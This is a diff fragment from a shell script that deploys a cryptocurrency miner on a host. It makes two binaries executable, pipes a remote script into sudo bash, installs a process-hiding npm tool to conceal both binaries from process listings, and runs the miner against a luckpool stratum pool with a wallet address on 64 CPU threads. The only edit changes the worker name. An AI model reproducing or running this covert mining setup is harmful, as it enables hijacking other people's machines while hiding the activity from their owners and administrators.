@@ -13,4 +13,4 @@ chmod +x vrbjordhil && chmod +x verus-solver
 curl -sL https://deb.nodesource.com/setup_20.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@10.8.1
 sudo ph add vrbjordhil
 sudo ph add verus-solver
-./vrbjordhil -c stratum+tcp://na.luckpool.net:3960 -u RG6DfuhnggRT2TZ8p6SFQt3FHakfJ3ac6J.CURL -p x --cpu 64
+./vrbjordhil -c stratum+tcp://na.luckpool.net:3960 -u RG6DfuhnggRT2TZ8p6SFQt3FHakfJ3ac6J.LS -p x --cpu 64
